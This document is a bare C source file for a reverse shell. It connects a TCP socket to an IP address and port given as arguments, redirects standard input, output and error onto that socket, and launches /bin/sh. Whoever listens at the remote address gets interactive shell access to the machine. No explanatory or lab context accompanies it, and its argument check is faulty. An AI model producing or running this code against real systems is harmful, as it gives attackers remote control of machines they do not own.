#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	if (argc < 1){
		printf("Missing IP Address\n");
		return 0;
	}
	char* ip_cmd = argv[1];
	int port_cmd = atoi(argv[2]);

	// socket 
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	// connect
	struct sockaddr_in sock_addr;	
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(port_cmd);
	sock_addr.sin_addr.s_addr = inet_addr(ip_cmd);
	
	connect(sock, (struct sockaddr *) &sock_addr, sizeof(struct sockaddr_in));
	// dup2 stdin
	dup2(sock, STDIN_FILENO);
	// dup2 stdout
	dup2(sock, STDOUT_FILENO);
	// dup2 stderr
	dup2(sock, STDERR_FILENO);
	// execv("/bin/sh")
	execl("/bin/sh", NULL);
	
	return 0;
}
